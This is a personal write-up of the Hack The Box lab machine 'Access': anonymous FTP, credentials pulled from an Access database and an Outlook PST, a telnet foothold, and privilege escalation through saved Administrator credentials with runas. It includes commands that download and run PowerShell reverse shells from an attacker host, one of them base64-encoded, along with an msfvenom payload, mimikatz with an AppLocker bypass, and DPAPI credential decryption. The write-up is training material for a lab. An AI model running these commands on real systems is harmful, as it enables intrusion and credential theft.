---
tags:
  - mdb
  - mdb-tool
  - pst
  - runas
---
***Overview**: Access is an Easy rated HTB machine that highlights how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It also exploits saved credentials to gain privileged access.*
# HTB: Access
## Scanning and Reconnaissance

- So we first start with a port scan to identify the open ports and we can see there are 3

![](assets/Access_assets/Pasted%20image%2020231115201222.png)

- then running a service scan on this open ports using Nmap

```shell
┌──(kali㉿kali)-[~/HTB/Access]
└─$ nmap -sV -sC -p21,23,80 10.10.10.98 -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 03:26 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Initiating NSE at 03:26
Completed NSE at 03:26, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:26
Completed Parallel DNS resolution of 1 host. at 03:26, 0.06s elapsed
Initiating Connect Scan at 03:26
Scanning 10.10.10.98 [3 ports]
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Completed Connect Scan at 03:26, 0.21s elapsed (3 total ports)
Initiating Service scan at 03:26
Scanning 3 services on 10.10.10.98
Completed Service scan at 03:29, 169.20s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.98.
Initiating NSE at 03:29
NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
Completed NSE at 03:29, 17.02s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 1.81s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.01s elapsed
Nmap scan report for 10.10.10.98
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.00s elapsed
Initiating NSE at 03:29
Completed NSE at 03:29, 0.01s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.84 seconds
                                                                   
```

### Port 80
- Navigating to Port 80, we are brought to the page below

![](assets/Access_assets/Pasted%20image%2020231115072050.png)

### FTP

- So from our Nmap scan we saw that we have anonymous access to the FTP server, so when we access it we see we have Backups and Engineers directory
- we then see a file backup.mdb in our Backups directory, so we save the file but we encounter an error

![](assets/Access_assets/Pasted%20image%2020231115092518.png)

- to fix the error, we just the mode to binary mode by typing `binary` and we are able to download the file

![](assets/Access_assets/Pasted%20image%2020231115092421.png)

- then in the Engineer's directory, we also have an archive Access Control.zip so we save that too

![](assets/Access_assets/Pasted%20image%2020231115095925.png)

![](assets/Access_assets/Pasted%20image%2020231115092452.png)

- so now that we have retrieved the mdb database file, lets analyze it using mdbtools, we can look at a resource at [https://askmeaboutlinux.com/2023/08/07/how-to-read-ms-access-database-using-mdbtools-in-linux/](https://askmeaboutlinux.com/2023/08/07/how-to-read-ms-access-database-using-mdbtools-in-linux/)
- to list the tables in the database, we can do

```shell
mdb-tables backup.mdb
```

![](assets/Access_assets/Pasted%20image%2020231115164243.png)

- we can also convert any table to csv format so we can view it using an application like LibreOffice
- so for example we can convert the Machines table to csv format using

```shell
mdb-export backup.mdb Machines > machinestable.csv
```

![](assets/Access_assets/Pasted%20image%2020231115163817.png)

- then we can open it using LibreOffice calc

![](assets/Access_assets/Pasted%20image%2020231115163756.png)
- so we saw a table auth_user, in our list of tables

![](assets/Access_assets/Pasted%20image%2020231115164404.png)

- so we can export the table to csv format and view it as well and we've identified some credentials

![](assets/Access_assets/Pasted%20image%2020231115164320.png)

- so we got the password for engineer as access4u@security
- so since the archive we retrieved earlier from the Engineer's directory is password protected, we can retrieve the contents using the password we just got for the user engineer

![](assets/Access_assets/Pasted%20image%2020231115164926.png)

- from the archive, we retrieved a file which is a pst file, Microsoft Outlook Personal storage file

![](assets/Access_assets/Pasted%20image%2020231115165007.png)

```ad-info
PST (Personal Storage Table) is a data file used by Microsoft Outlook and other email programs to store personal data on your computer, this data includes emails, calendars, tasks, notes etc.
- its purposes are for backup, offline storage and data transfer
```
- to view the file we can install pst-utils

```shell
sudo apt install pst-utils
```

- after then we can can list the contents in the pst file using `lspst`

![](assets/Access_assets/Pasted%20image%2020231115170711.png)

- we can use the `readpst` command to export the data from the pst file to MBOX format

```shell
readpst -o output_dir 'Access Control.pst
```

![](assets/Access_assets/Pasted%20image%2020231115172535.png)

![](assets/Access_assets/Pasted%20image%2020231115172546.png)

```ad-info
unlike pst that is propritary to Microsoft Outlook, MBOX is an open format used by alot of email clients and software
```

- so now we can then view the mbox file in email clients like thunderbird, and we can see that we now have the password for the security user as 4Cc3ssC0ntr0ller

![](assets/Access_assets/Pasted%20image%2020231115173727.png)

## Foothold
### telnet
 - we are able to use the credentials we found to access the Microsoft telnet service on port 23, and we get a shell

![](assets/Access_assets/Pasted%20image%2020231115173936.png)

- and we have our user flag

![](assets/Access_assets/Pasted%20image%2020231115174017.png)

## Privilege Escalation
- we can check who we are as well as the privileges we have on the machine

```shell
C:\Users\security\Desktop>whoami /all

USER INFORMATION
----------------

User Name       SID                                       
=============== ==========================================
access\security S-1-5-21-953262931-566350628-63446256-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                        Attributes                                        
====================================== ================ ========================================== ==================================================
Everyone                               Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
ACCESS\TelnetClients                   Alias            S-1-5-21-953262931-566350628-63446256-1000 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                    Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled



C:\Users\security\Desktop>systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          11/15/2023, 8:22:11 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     6,143 MB
Available Physical Memory: 5,424 MB
Virtual Memory: Max Size:  12,285 MB
Virtual Memory: Available: 11,559 MB
Virtual Memory: In Use:    726 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A

```

- we notice that we have a hidden directory .yawcam

![](assets/Access_assets/Pasted%20image%2020231115181550.png)

- we can view the contents of this directory

![](assets/Access_assets/Pasted%20image%2020231115181700.png)

- we can also recursively copy the content of this directory by setting up our own smb server, so we can analyze the files on our machine. so set up our smb server

```shell
impacket-smbserver smb ~/HTB/smb 
```

- then recursively copy using the xcopy command

```shell
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.6\smb\win

```

![](assets/Access_assets/Pasted%20image%2020231115183019.png)

- and we can see that we are retrieving the files in our smbserver

![](assets/Access_assets/Pasted%20image%2020231115183040.png)

- we can see the version for the yawcam as 0.6.2 in the ver.dat file, so we can check if there are any vulnerabilities related to this version

![](assets/Access_assets/Pasted%20image%2020231115183112.png)

### Check for stored credentials
- we can use the cmdkey command to check for stored credentials on our target

![](assets/Access_assets/Pasted%20image%2020231115201516.png)

- so we can run the command, and we can see that we do have stored Administrator

```shell
cmdkey /list
```

![](assets/Access_assets/Pasted%20image%2020231115191922.png)

- so we can use the runas command with the `/savecred` to run commands as the user using the stored credentials, so lets try to access a non-existent file in the share in our smbserver to see if we can retrieve the hash of the administrator, so we run 

```shell
runas /savecred /user:ACCESS\Administrator "\\10.10.14.19\smb\evil.exe"
```

- and in our smb server, we can see that we get the hash

![](assets/Access_assets/Pasted%20image%2020231115192515.png)

```
[*] AUTHENTICATE_MESSAGE (ACCESS\Administrator,ACCESS)
[*] User ACCESS\Administrator authenticated successfully
[*] Administrator::ACCESS:aaaaaaaaaaaaaaaa:314372510a48afa054763b9fab243180:010100000000000000c50a05f117da0107a7a2915828e9be00000000010010005600780054006d004900630079006a00030010005600780054006d004900630079006a0002001000690055004900590074004d0058006d0004001000690055004900590074004d0058006d000700080000c50a05f117da0106000400020000000800300030000000000000000000000000300000c45662c81156ddad2d2c025027fef760c3ebcf4071017940cae8d043587e5dc90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003900000000000000000000000000

```

- we can also test this by running the `whoami` command as administrator and then putting the output in a file, and we can see that it shows that we are administrator, because we ran the command as administrator

```shell
runas /env /noprofile /savecred /user:ACCESS\Administrator "cmd.exe /c whoami > whoami.txt"
```

![](assets/Access_assets/Pasted%20image%2020231115194037.png)

```ad-info
/env: it loads the current environmental variables
/noprofile: prevents the loading of the user's profile, which makes the execution of the program faster
/savecred: specify we are using saved credentials if the user's credentials are cached in the system or to save credentials
/user: specify the user
then the command we want to run
```

Windows Privilege Escalation with Runas: [https://juggernaut-sec.com/runas/](https://juggernaut-sec.com/runas/)
### Reverse shell with runas
- so we use msfvenom to generate a reverse shell payload for us, and then we will execute this payload as adminstrator
![](assets/Access_assets/Pasted%20image%2020231115195521.png)

- after we've placed the file in our smb share on our smb server, we can then run the payload using runas

```shell
runas /env /noprofile /savecred /user:ACCESS\Administrator "\\10.10.14.6\smb\evil.exe"
```

![](assets/Access_assets/Pasted%20image%2020231115195612.png)

- and we can see that in our nc listener, we also got a shell as administrator

![](assets/Access_assets/Pasted%20image%2020231115200239.png)

- and we can view the root file

![](assets/Access_assets/Pasted%20image%2020231115200312.png)


Walkthrough
- when dealing with FTP and he has anonymous login, he just downloads everything using
```
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```
we have to add --no-passive if the PASV mode failed
- for a zip file we can do 
```
7z l -slt Access\ Control.zip
```
slt tells us information about how the file was encrypted
l lists the information of the zip
we will see AES-256 Deflate
- so ltes try to crack this zipt
```
zip2john Access.zip > hash
```
- for backup.mdb
```
file backup.mdb
```
we can do strins first on the file, before we can use mdbtools
```
strings -n 8 backup.mdb | sort -u > ../Engineer/wordlist
```
remove anything thats not 8 characters
- then we try to crack it with it
```
john Access\ Control.hash --wordlist=wordlist

john Access\ Control.hash --show
```
- or using mdb-tools
```
mbd-sql backup.mdb
list tables
go
```
or do and it gives us the same thing
```
mdb-tables backup.mdb
```
- then we will do
```
for i in $(mdb-tables backup.mdb); do echo $i; done
```
- then we can do 
```
mkdir tables
for i in $(mdb-tables ackup.mdb); do mdb-export backup.mdb $i > tables/$i; done
```
then we can pick which table we want to look at
- we can do
```
wc -l * | sort -n
```

sort -n to tell it numbers then we ignore everything that is 1 like cause that is listing the columns of the table
- so now we can just do 
```
cat auth_user
```
- if we do file on the pst file, we will seee it is an outlook email folder
- we can do 
```
readpst file.pst
```
- then it ocnverted into an mbox file
- if we
```
less file.mbox
```
we can read the emails from it
- we can do 
```
echo securitury:password
```
it will be in our history so then if we do ctrl+r 4C, we can see the password (cause the password contained 4C)
- If we do `powershell` and we see it runs, copy the Invoke-PowerShellTCP.ps1 from nishang to the directory(change your IP), then we spin up a server, setup nc
```
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/nishang.ps1')
```
- we can alsoretrive JAWS an enumeration tool when we get our shell
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/jaws-enum.ps1')
```

```ad-note
we can do `git pull` to see if there are any updates on git clone files
```

- we will see stored credentials, we can also do
```
cmdkey /list
```
Sth that  has to do with DPAPI
- we can check the permissions on the web server
```
cd C:\inetpub\wwwroot
then we can ddo 
echo 'Please sub' > test
but we don't have write permissions
```
- if we poke around we can see a lnk file in Users]Public\Desktop, we can do 
```
Get-Content "file.lnk"
```
if we wanted to extract the linke we can do it with PS
```powershell
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-ChildItem *.lnk
$shortcut # we can see the lnk file
```

no that we have the comobject created with the first command that we ran, we can do 
```powershell
$WScript.createshortcut($shortcut) # it wont create it if we specify sth that already exists so we can see the FullName and information about the link
```
- we can try to use the saved creds to get a reverse shell but it didn't work
```
runas /user:ACCESS\Administrator /savecred "powershell """IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/9002.ps1')""""
```
- we can convert the iex command to base64 to get a reverse powershell with nishang (9002.ps1) using
```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```
LE is little endian
```
runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand <base64>"
```
-  and we get a reverse shell in our listener and we get a shell as admin

Lets pretend we wanted to get the credentials from the machine using mikatze
- get the mimikatz
```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.3:8000/mimikatz.exe','mimikatz.exe')
```
we use DownloadFile and we save it as mimikatz.exe
```
.\mimikatz.exe
```
- if we see the program is blocked by group policy, so we will move it to a windows directory where we can bypass this (Applocker bypass list)
so using [UltimateAppLockerByPassList/Generic-AppLockerbypasses.md at master · api0cradle/UltimateAppLockerByPassList · GitHub](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

```
copy mimikatz.exe C:\Windows\System32\spool\drivers\color
cd C:\Windows\System32\spool\drivers\color
.\mimikatz.exe
```
but it also didn't work
- he tried to set up a meterpreter using unicorn.rc and msf.ps1
- ad tried using empire.ps1
```
msfdb run
```
it starts the database if its not started and starts msfconsole
so we can use kiwi in in metasploit
search google `dpapi harmj0y`
[Operational Guidance for Offensive User DPAPI Abuse | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)
```ad-note
anything windows or AD related jut put the term and then harmj0y in it
```

```
kiwi_cmd '"dpapi::"'
```
- (Follow the guide in that link) in our meterpreter session, we do
```
cd /users/security/appdata/Roaming/Microsoft/Protect/<SID>
```
and you will see the masterkey(2 master keys, pick the one you know the box was created)
then do 
```
kiwi_cmd '"dpapi::masterkey /in:\users\security\appdata\Roaming\Microsoft\Protect\<SID>\<key>"'
```
but it didn't work
so we dowload them instead
download 0*
download 4*
we try to use the masterkey generated for each of these files so we can see which one of them works and gives the clear text password
- the best way to run mimikatz is not to run it at all but to grab the files in that directory and also grab the file
```
\users\security\appdata\Roaming\Microsoft\Credentials
```
download 51*

- start the smbserver and grab the files on a windows machine
- set defender status to off
- copy mimikatz to the windows too
- then we can run
```
dpapi::masterkey /in:<paste masterkey filename> /sid:<sid> /password:
```
to decrypt the file we put in the SID of the user
this is to extract the master key
and the password of the user, which is the one we retrieved from the mailbox
- so now we have the `key` we can do another dpapi call
```
dpapi::cred /in:<filename of that file from the credentials dir>
```
 and we get the credentials in plain text
